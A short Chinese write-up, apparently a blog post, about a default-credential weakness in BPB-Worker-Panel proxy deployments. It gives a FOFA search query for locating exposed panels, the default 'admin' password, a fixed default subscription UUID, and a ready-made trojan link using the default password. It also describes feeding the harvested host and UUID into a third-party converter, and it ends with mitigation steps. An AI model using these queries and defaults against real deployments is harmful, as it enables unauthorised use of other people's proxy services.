## 仓库地址
https://github.com/bia-pain-bache/BPB-Worker-Panel

## bug
相关 issue: https://github.com/bia-pain-bache/BPB-Worker-Panel/issues/187  
作者认为不会泄漏个人信息，已关闭 issue

### bug 复现
#### 面板默认密码或者默认UUID
https://fofa.info/ 网络测绘网站
搜索
```text
443 端口
icon_hash="-1354027319" && asn="13335" && port="443"
或者 80 端口
icon_hash="-1354027319" && asn="13335" && port="80"
```
尝试访问 /login ，使用弱口令 admin
或者访问 默认订阅 /sub/89b3cbba-e6ac-485a-9481-976a0415eab9

如果成功，提取节点 host 和 uuid

将host和uuid填入订阅器对应的值，https://VLESS.cmliussss.net/sub?host=[BPB的host]&uuid=[BPB的uuid]

参考：https://blog.cmliussss.com/p/BPBbug/

#### 2.5.3版本以上
```text
trojan://bpb-trojan@www.vpslook.com:443?security=tls&sni=这里填域名&alpn=h3&fp=randomized&allowlnsecure=1&type=ws&host=这里填域名&path=%2Ftr%3Fed%3D2560#BPB
```
版本是 2.5.3以上，复制链接到 v2ray 客户端，替换需要填写的域名

参考：https://www.freedidi.com/17131.html

### 解决bug
1. 面板密码修改
2. 设置 UUID 变量
3. 设置 TR_PASS 变量

依然存在的问题，反向代理其它网站，依然有被fofa等网络测绘网站扫描到的风险
